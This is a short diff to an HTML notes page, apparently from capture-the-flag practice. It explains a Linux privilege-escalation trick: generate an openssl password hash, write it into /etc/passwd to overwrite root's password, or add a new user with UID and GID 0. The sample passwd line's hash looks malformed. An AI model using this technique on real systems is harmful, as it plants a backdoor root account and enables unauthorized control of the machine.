@@ -8,4 +8,9 @@ Use openssl passwd --help (to show options)<br/>
 openssl passwd &lt;password&gt; &#09;#gives encrypted passwd in stdout<br/>
 <br/>
 Now add the encrypted password to a user in /etc/passwd (overwrite someone elses password like root!)<br/>
-You can now login with that password</body></html>
+You can now login with that password<br/>
+<br/>
+<br/>
+or just create a new user with UID and GID 0:<br/>
+openssl passwd -1 -salt ippsec hackthebox<br/>
+ippsec:$1$ojfoawijefoa;iwjfeoi:0:0:root:/root:/bin/bash</body></html>
